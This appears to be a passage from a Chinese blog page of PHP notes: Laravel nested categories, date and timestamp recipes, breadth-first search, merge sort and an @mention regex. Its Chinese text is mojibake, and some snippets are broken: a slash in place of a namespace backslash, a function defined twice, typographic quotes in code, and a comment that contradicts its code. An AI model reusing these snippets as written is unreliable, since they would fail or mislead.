<h3 id="æ— é™çº§åˆ†ç±»"><a href="#æ— é™çº§åˆ†ç±»" class="headerlink" title="æ— é™çº§åˆ†ç±»"></a>æ— é™çº§åˆ†ç±»</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">php artisan make:migration create_category_table --create=category</span><br><span class="line"><span class="comment">//https://segmentfault.com/a/1190000010359094</span></span><br><span class="line">Schema::create(<span class="string">'categorys'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">Blueprint $table</span>) </span>&#123;</span><br><span class="line">            $table-&gt;increments(<span class="string">'id'</span>);</span><br><span class="line">            $table-&gt;integer(<span class="string">'parent_id'</span>);</span><br><span class="line">            $table-&gt;string(<span class="string">'code'</span>);</span><br><span class="line">            $table-&gt;string(<span class="string">'name'</span>);</span><br><span class="line">            $table-&gt;string(<span class="string">'path'</span>);</span><br><span class="line">            $table-&gt;timestamps();</span><br><span class="line">        &#125;);</span><br><span class="line">php artisan migrate</span><br><span class="line"></span><br><span class="line">php artisan make: model Category -m</span><br><span class="line">use Illuminate\Database\Eloquent\Model;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Category</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">childCategory</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;hasMany(<span class="string">'App\Category'</span>, <span class="string">'parent_id'</span>, <span class="string">'id'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">allChildrenCategorys</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;childCategory()-&gt;<span class="keyword">with</span>(<span class="string">'allChildrenCategorys'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$categorys = App/Category::<span class="keyword">with</span>(<span class="string">'allChildrenCategorys'</span>)-&gt;first();</span><br><span class="line">$categorys-&gt;allChildrenCategorys; </span><br><span class="line">$categorys-&gt;allChildrenCategorys-&gt;first()-&gt;allChildrenCategorys;</span><br><span class="line"> $arr = [];</span><br><span class="line">    array_walk_recursive($categories,<span class="function"><span class="keyword">function</span> (<span class="params">$v, $k</span>) <span class="title">use</span>(<span class="params">&amp;$arr</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($k == <span class="string">'id'</span>)</span><br><span class="line">            $arr[] = $v;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure>
<h3 id="æœ¬å‘¨ä¸€çš„æ—¶é—´æˆ³"><a href="#æœ¬å‘¨ä¸€çš„æ—¶é—´æˆ³" class="headerlink" title="æœ¬å‘¨ä¸€çš„æ—¶é—´æˆ³"></a>æœ¬å‘¨ä¸€çš„æ—¶é—´æˆ³</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">strtotime(<span class="string">'monday'</span>);</span><br><span class="line">å› ä¸ºè¿™æ ·ä¼šå¯¼è‡´åœ¨éå‘¨ä¸€çš„æ—¶å€™è®¡ç®—åˆ°ä¸‹ä¸€ä¸ªå‘¨ä¸€ï¼Œ</span><br><span class="line">https:<span class="comment">//www.h57.pw/2018/11/27/calculate-the-timestamp-of-this-monday/</span></span><br><span class="line">æ‰€ä»¥æˆ‘ä»¬è¦åœ¨è®¡ç®—ä¹‹å‰å…ˆåˆ¤å®šä¸€ä¸‹å½“å‰æ˜¯å‘¨å‡ ï¼Œå¦‚æœæ˜¯å‘¨ä¸€å°±é‡‡ç”¨ <span class="string">'monday'</span> éå‘¨ä¸€çš„æ—¶å€™é‡‡ç”¨<span class="string">'previous monday'</span></span><br><span class="line"><span class="keyword">if</span>(date(<span class="string">'w'</span>) == <span class="number">1</span>) &#123;</span><br><span class="line">    $time = strtotime(<span class="string">'monday'</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $time = strtotime(<span class="string">'previous monday'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">è€å¤–è®¤ä¸ºâ€œ<span class="keyword">this</span> mondayâ€æ˜¯ä¸‹å‘¨ä¸€ï¼Œâ€œlast mondayâ€æ˜¯æœ¬å‘¨ä¸€</span><br><span class="line">ç›´æ¥<span class="string">"-2 monday"</span>å°±å¥½äº†ï¼Œæˆ–è€…<span class="string">"monday last week"</span></span><br><span class="line">date(<span class="string">'w'</span>)å¾—åˆ°å½“å‰å‘¨å‡ ,ç”±äºå‘¨ä¸€è‡³å‘¨å…­åˆ†åˆ«æ˜¯<span class="number">1</span><span class="number">-6</span>ï¼Œå‘¨æ—¥æ˜¯<span class="number">0</span>ã€‚å½“å€¼ä¸º<span class="number">0</span>çš„æ—¶å€™ï¼Œä¸Šå‘¨ä¸€æ˜¯<span class="number">13</span>å¤©å‰ã€‚å…¶ä½™å°±æ˜¯date(<span class="string">'w'</span>)+<span class="number">6</span>å¤©å‰ã€‚</span><br><span class="line"></span><br><span class="line">$days = date(<span class="string">'w'</span>)==<span class="number">0</span>?<span class="number">13</span>:date(<span class="string">'w'</span>)+<span class="number">6</span>;</span><br><span class="line"></span><br><span class="line">echo date(<span class="string">'Y-m-d'</span>,time()-$days*<span class="number">86400</span>);</span><br><span class="line">&gt;&gt;&gt; date(<span class="string">'Ymd His'</span>,strtotime(<span class="string">'-1 monday'</span>))</span><br><span class="line">=&gt; <span class="string">"20190429 000000"</span></span><br><span class="line">&gt;&gt;&gt; date(<span class="string">'Ymd His'</span>,strtotime(<span class="string">'-1 monday 2019-05-06'</span>))</span><br><span class="line">=&gt; <span class="string">"20190429 000000"</span></span><br><span class="line">&gt;&gt;&gt; date(<span class="string">'Ymd His'</span>,strtotime(<span class="string">' monday 2019-05-06'</span>))</span><br><span class="line">=&gt; <span class="string">"20190506 000000"</span></span><br><span class="line">echo <span class="string">'&lt;br&gt;ä¸Šå‘¨:&lt;br&gt;'</span>;</span><br><span class="line">echo date(<span class="string">"Y-m-d H:i:s"</span>,mktime(<span class="number">0</span>, <span class="number">0</span> , <span class="number">0</span>,date(<span class="string">"m"</span>),date(<span class="string">"d"</span>)-date(<span class="string">"w"</span>)+<span class="number">1</span><span class="number">-7</span>,date(<span class="string">"Y"</span>))),<span class="string">"\n"</span>;</span><br><span class="line">echo date(<span class="string">"Y-m-d H:i:s"</span>,mktime(<span class="number">23</span>,<span class="number">59</span>,<span class="number">59</span>,date(<span class="string">"m"</span>),date(<span class="string">"d"</span>)-date(<span class="string">"w"</span>)+<span class="number">7</span><span class="number">-7</span>,date(<span class="string">"Y"</span>))),<span class="string">"\n"</span>;</span><br><span class="line">echo <span class="string">'&lt;br&gt;æœ¬å‘¨:&lt;br&gt;'</span>;</span><br><span class="line">echo date(<span class="string">"Y-m-d H:i:s"</span>,mktime(<span class="number">0</span>, <span class="number">0</span> , <span class="number">0</span>,date(<span class="string">"m"</span>),date(<span class="string">"d"</span>)-date(<span class="string">"w"</span>)+<span class="number">1</span>,date(<span class="string">"Y"</span>))),<span class="string">"\n"</span>;</span><br><span class="line">echo date(<span class="string">"Y-m-d H:i:s"</span>,mktime(<span class="number">23</span>,<span class="number">59</span>,<span class="number">59</span>,date(<span class="string">"m"</span>),date(<span class="string">"d"</span>)-date(<span class="string">"w"</span>)+<span class="number">7</span>,date(<span class="string">"Y"</span>))),<span class="string">"\n"</span>;</span><br><span class="line"> </span><br><span class="line">echo <span class="string">'&lt;br&gt;ä¸Šæœˆ:&lt;br&gt;'</span>;</span><br><span class="line">echo date(<span class="string">"Y-m-d H:i:s"</span>,mktime(<span class="number">0</span>, <span class="number">0</span> , <span class="number">0</span>,date(<span class="string">"m"</span>)<span class="number">-1</span>,<span class="number">1</span>,date(<span class="string">"Y"</span>))),<span class="string">"\n"</span>;</span><br><span class="line">echo date(<span class="string">"Y-m-d H:i:s"</span>,mktime(<span class="number">23</span>,<span class="number">59</span>,<span class="number">59</span>,date(<span class="string">"m"</span>) ,<span class="number">0</span>,date(<span class="string">"Y"</span>))),<span class="string">"\n"</span>;</span><br><span class="line">echo <span class="string">'&lt;br&gt;æœ¬æœˆ:&lt;br&gt;'</span>;</span><br><span class="line">echo date(<span class="string">"Y-m-d H:i:s"</span>,mktime(<span class="number">0</span>, <span class="number">0</span> , <span class="number">0</span>,date(<span class="string">"m"</span>),<span class="number">1</span>,date(<span class="string">"Y"</span>))),<span class="string">"\n"</span>;</span><br><span class="line">echo date(<span class="string">"Y-m-d H:i:s"</span>,mktime(<span class="number">23</span>,<span class="number">59</span>,<span class="number">59</span>,date(<span class="string">"m"</span>),date(<span class="string">"t"</span>),date(<span class="string">"Y"</span>))),<span class="string">"\n"</span>;</span><br><span class="line"> </span><br><span class="line">$getMonthDays = date(<span class="string">"t"</span>,mktime(<span class="number">0</span>, <span class="number">0</span> , <span class="number">0</span>,date(<span class="string">'n'</span>)+(date(<span class="string">'n'</span>)<span class="number">-1</span>)%<span class="number">3</span>,<span class="number">1</span>,date(<span class="string">"Y"</span>)));<span class="comment">//æœ¬å­£åº¦æœªæœ€åä¸€æœˆå¤©æ•°</span></span><br><span class="line">echo <span class="string">'&lt;br&gt;æœ¬å­£åº¦:&lt;br&gt;'</span>;</span><br><span class="line">echo date(<span class="string">'Y-m-d H:i:s'</span>, mktime(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,date(<span class="string">'n'</span>)-(date(<span class="string">'n'</span>)<span class="number">-1</span>)%<span class="number">3</span>,<span class="number">1</span>,date(<span class="string">'Y'</span>))),<span class="string">"\n"</span>;</span><br><span class="line">echo date(<span class="string">'Y-m-d H:i:s'</span>, mktime(<span class="number">23</span>,<span class="number">59</span>,<span class="number">59</span>,date(<span class="string">'n'</span>)+(date(<span class="string">'n'</span>)<span class="number">-1</span>)%<span class="number">3</span>,$getMonthDays,date(<span class="string">'Y'</span>))),<span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * è·å–æŒ‡å®šå¹´æœˆçš„å¼€å§‹å’Œç»“æŸæ—¶é—´æˆ³</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param int $year å¹´ä»½</span></span><br><span class="line"><span class="comment"> * @param int $month æœˆä»½</span></span><br><span class="line"><span class="comment"> * @return array(å¼€å§‹æ—¶é—´,ç»“æŸæ—¶é—´)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getMonthBeginAndEnd</span>(<span class="params">$year = <span class="number">0</span>, $month = <span class="number">0</span></span>) </span>&#123;</span><br><span class="line">    $year = $year ? $year : date(<span class="string">'Y'</span>);</span><br><span class="line">    $month = $month ? $month : date(<span class="string">'m'</span>);</span><br><span class="line">    $d = date(<span class="string">'t'</span>, strtotime($year . <span class="string">'-'</span> . $month));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> [<span class="string">'begin'</span> =&gt; strtotime($year . <span class="string">'-'</span> . $month), <span class="string">'end'</span> =&gt; mktime(<span class="number">23</span>, <span class="number">59</span>, <span class="number">59</span>, $month, $d, $year)];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è·å–æŒ‡å®šæ—¶é—´æˆ³æ‰€åœ¨çš„æœˆä»½çš„å¼€å§‹æ—¶é—´æˆ³å’Œç»“æŸæ—¶é—´æˆ³</span></span><br><span class="line"><span class="comment"> *http://www.phpernote.com/php-function/1439.html</span></span><br><span class="line"><span class="comment"> * @param int $timestamp</span></span><br><span class="line"><span class="comment"> * @return array(å¼€å§‹æ—¶é—´,ç»“æŸæ—¶é—´)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getMonthBeginAndEnd</span>(<span class="params">$timestamp = <span class="number">0</span></span>) </span>&#123;</span><br><span class="line">    $timestamp = $timestamp ? $timestamp : time();</span><br><span class="line"></span><br><span class="line">    $year = date(<span class="string">'Y'</span>, $timestamp);</span><br><span class="line">    $month = date(<span class="string">'m'</span>, $timestamp);</span><br><span class="line">    $d = date(<span class="string">'t'</span>, strtotime($year . <span class="string">'-'</span> . $month));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> [<span class="string">'begin'</span> =&gt; strtotime($year . <span class="string">'-'</span> . $month), <span class="string">'end'</span> =&gt; mktime(<span class="number">23</span>, <span class="number">59</span>, <span class="number">59</span>, $month, $d, $year)];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="å¹¿åº¦ä¼˜å…ˆæœç´¢"><a href="#å¹¿åº¦ä¼˜å…ˆæœç´¢" class="headerlink" title="å¹¿åº¦ä¼˜å…ˆæœç´¢"></a>å¹¿åº¦ä¼˜å…ˆæœç´¢</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * å¹¿åº¦æœç´¢</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * ä½ çš„æœ‹å‹å…³ç³»ï¼Œä»¥åŠæœ‹å‹çš„æœ‹å‹çš„å…³ç³»ï¼ŒæŸ¥çœ‹ä½ çš„æœ‹å‹æˆ–è€…æœ‹å‹çš„æœ‹å‹æ˜¯ä¸æ˜¯åŒ…å« m ç»“å°¾çš„åå­—</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// éœ€è¦æ£€ç´¢çš„æ•°ç»„</span></span><br><span class="line">$graph = [];</span><br><span class="line">$graph[<span class="string">'you'</span>] = [<span class="string">'alice'</span>, <span class="string">'bob'</span>, <span class="string">'claire'</span>];</span><br><span class="line">$graph[<span class="string">'bob'</span>] = [<span class="string">'anuj'</span>, <span class="string">'peggy'</span>];</span><br><span class="line">$graph[<span class="string">'alice'</span>] = [<span class="string">'peggy'</span>];</span><br><span class="line">$graph[<span class="string">'claire'</span>] = [<span class="string">'thom'</span>, <span class="string">'jonny'</span>];</span><br><span class="line">$graph[<span class="string">'anuj'</span>] = [];</span><br><span class="line">$graph[<span class="string">'peggy'</span>] = [];</span><br><span class="line">$graph[<span class="string">'thom'</span>] = [];</span><br><span class="line">$graph[<span class="string">'jonny'</span>] = [];</span><br><span class="line"></span><br><span class="line"><span class="comment">// æœç´¢è¿‡çš„æ•°ç»„</span></span><br><span class="line">$searchedItem = [];</span><br><span class="line"><span class="comment">// å¾…æ£€ç´¢çš„æ•°ç»„</span></span><br><span class="line">$waitSearchArray = [];</span><br><span class="line"><span class="comment">// å°†ç¬¬ä¸€å±‚çš„å…³ç³»åŠ å…¥åˆ°ç­‰å¾…æœç´¢çš„æ•°ç»„</span></span><br><span class="line">$waitSearchArray = array_merge($waitSearchArray, $graph[<span class="string">'you'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// å°†ç»“æœå…ƒç´ èµ‹å€¼ä¸º false</span></span><br><span class="line">$resultName = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//éœ€è¦æŸ¥æ‰¾çš„å­—ç¬¦</span></span><br><span class="line">$findChar = <span class="string">'z'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å¦‚æœç­‰å¾…æœç´¢çš„æ•°ç»„ä¸ä¸ºç©ºå°±å¾ªç¯æŸ¥æ‰¾</span></span><br><span class="line"><span class="keyword">while</span> ($waitSearchArray) &#123;</span><br><span class="line">    <span class="comment">// ä»é˜Ÿåˆ—å¤´éƒ¨å¼¹å‡ºä¸€ä¸ªå…ƒç´ </span></span><br><span class="line">    $name = array_shift($waitSearchArray);</span><br><span class="line">    <span class="comment">// å¦‚æœå¾…æ£€æŸ¥çš„å…ƒç´ åœ¨å·²ç»æœç´¢è¿‡çš„æ•°ç»„ä¸­ï¼Œå°±è·³è¿‡ï¼Œè¿™ä¸ªæ˜¯ç”¨æ¥é˜²æ­¢å¾ªç¯æ£€æŸ¥çš„</span></span><br><span class="line">    <span class="keyword">if</span> (in_array($name, $searchedItem)) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// è·å–æœ€åä¸€ä¸ªå­—ç¬¦</span></span><br><span class="line">    $lastChar = substr($name, strlen($name) - <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// å¦‚æœæœ€åä¸€ä¸ªå­—ç¬¦æ˜¯ mï¼Œå°±è¯´æ˜æ‰¾åˆ°äº†ï¼ŒæŠŠç»“æœèµ‹å€¼ï¼Œç„¶åè·³å‡ºå¾ªç¯</span></span><br><span class="line">    <span class="keyword">if</span> ($lastChar == $findChar) &#123;</span><br><span class="line">        $resultName = $name;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åˆ°è¿™é‡Œäº†è¯´æ˜æ²¡æœ‰æ‰¾åˆ°ï¼Œé‚£ä¹ˆæŠŠè¿™ä¸ªäººçš„åå­—ï¼Œæ”¾å…¥åˆ°å·²ç»æœç´¢è¿‡çš„æ•°ç»„ä¸­</span></span><br><span class="line">    $searchedItem[] = $name;</span><br><span class="line">    <span class="comment">// ç„¶åå†æŠŠè¿™ä¸ªåå­—çš„æœ‹å‹å…³ç³»åŠ å…¥åˆ°å¾…æœç´¢çš„æ•°ç»„ä¸­</span></span><br><span class="line">    $waitSearchArray = array_merge($waitSearchArray, $graph[$name]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">https:<span class="comment">//www.h57.pw/2017/11/14/breadthfirst-search-php-implementation/</span></span><br><span class="line">var_dump($resultName);</span><br></pre></td></tr></table></figure>
<h3 id="å½’å¹¶æ’åº"><a href="#å½’å¹¶æ’åº" class="headerlink" title="å½’å¹¶æ’åº"></a>å½’å¹¶æ’åº</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sortArr</span>(<span class="params">$arr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (count($arr) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> $arr;</span><br><span class="line">    &#125;</span><br><span class="line">    $mid = count($arr) / <span class="number">2</span>;</span><br><span class="line">    $arr1 = array_slice($arr, <span class="number">0</span>, $mid);</span><br><span class="line">    $arr2 = array_slice($arr, $mid, count($arr));</span><br><span class="line">    $arr1 = sortArr($arr1);</span><br><span class="line">    $arr2 = sortArr($arr2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> mergeArr($arr1, $arr2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mergeArr</span>(<span class="params">$arr1, $arr2</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!is_array($arr1)) &#123;</span><br><span class="line">        $arr1[] = $arr1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!is_array($arr2)) &#123;</span><br><span class="line">        $arr2[] = $arr2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $i =<span class="number">0</span>;</span><br><span class="line">    $j = <span class="number">0</span>;</span><br><span class="line">    $arr1Length = count($arr1);</span><br><span class="line">    $arr2Length = count($arr2);</span><br><span class="line">    $returnArr = [];</span><br><span class="line">    <span class="keyword">while</span>($i &lt; $arr1Length &amp;&amp; $j &lt; $arr2Length) &#123;</span><br><span class="line">        <span class="keyword">if</span>($arr1[$i] &gt; $arr2[$j]) &#123;</span><br><span class="line">            $returnArr[] = $arr2[$j];</span><br><span class="line">            $j++;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $returnArr[] = $arr1[$i];</span><br><span class="line">            $i++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>($tmp = $i; $tmp &lt; $arr1Length; $tmp++) &#123;</span><br><span class="line">        $returnArr[] = $arr1[$tmp];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>($tmp = $j; $tmp &lt; $arr2Length; $tmp++) &#123;</span><br><span class="line">        $returnArr[] = $arr2[$tmp];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $returnArr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$arr = [<span class="number">1</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$sortableArr = sortArr($arr);</span><br><span class="line"><span class="comment">//https://www.h57.pw/2016/09/25/php-merge-sort/</span></span><br><span class="line">foreach ($sortableArr <span class="keyword">as</span> $a) &#123;</span><br><span class="line">    print_r($a . <span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="æ­£åˆ™è¡¨è¾¾å¼å®ç°-æŸäºº"><a href="#æ­£åˆ™è¡¨è¾¾å¼å®ç°-æŸäºº" class="headerlink" title="æ­£åˆ™è¡¨è¾¾å¼å®ç° @æŸäºº"></a>æ­£åˆ™è¡¨è¾¾å¼å®ç° @æŸäºº</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">if (preg_match_all (â€˜#@\w+#uâ€™, â€˜@å¼ å…¨è›‹ å«æ³ªè´¨æ£€ @ä¸‰æ˜Ÿ Note7 è¢«ç‚¸é£ï¼Œå¬è¯´ @ç‚¸æœº è·Ÿ @å•¤é…’ æ›´é…å“¦ï¼â€™, $matches)) &#123;</span><br><span class="line">var_export($matches);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// è¾“å‡º</span></span><br><span class="line">array (</span><br><span class="line"><span class="number">0</span> =&gt;</span><br><span class="line">array (</span><br><span class="line"><span class="number">0</span> =&gt; â€˜@å¼ å…¨è›‹â€™,</span><br><span class="line"><span class="number">1</span> =&gt; â€˜@ä¸‰æ˜Ÿ Note7â€™,</span><br><span class="line"><span class="number">2</span> =&gt; â€˜@ç‚¸æœºâ€™,</span><br><span class="line"><span class="number">3</span> =&gt; â€˜@å•¤é…’â€™,</span><br><span class="line">),</span><br><span class="line">)</span><br><span class="line">æ­£åˆ™è¡¨è¾¾å¼ #@\w+#u ä¸­:</span><br><span class="line">#æ˜¯åˆ†éš”ç¬¦.</span><br><span class="line">u æ˜¯ä¿®é¥°ç¬¦ï¼Œè¡¨ç¤º Unicode.</span><br><span class="line">\w æ˜¯å…ƒå­—ç¬¦ï¼Œåœ¨ ASCII ä¸‹ç­‰ä»·äº [A-Za-z0<span class="number">-9</span>_], åœ¨ Unicode ä¸‹è¡¨ç¤ºå­—ç¬¦ (åŒ…æ‹¬æ±‰å­—) å’Œæ•°å­—å’Œä¸‹åˆ’çº¿.</span><br><span class="line">+ æ˜¯é‡è¯ï¼Œè¡¨ç¤º <span class="number">1</span> ä¸ªæˆ–å¤šä¸ªï¼Œç­‰ä»·äº &#123;<span class="number">1</span>,&#125;</span><br></pre></td></tr></table></figure>
<h3 id="å¿«æ’å’Œå½’å¹¶æ’åº"><a href="#å¿«æ’å’Œå½’å¹¶æ’åº" class="headerlink" title="å¿«æ’å’Œå½’å¹¶æ’åº"></a>å¿«æ’å’Œå½’å¹¶æ’åº</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 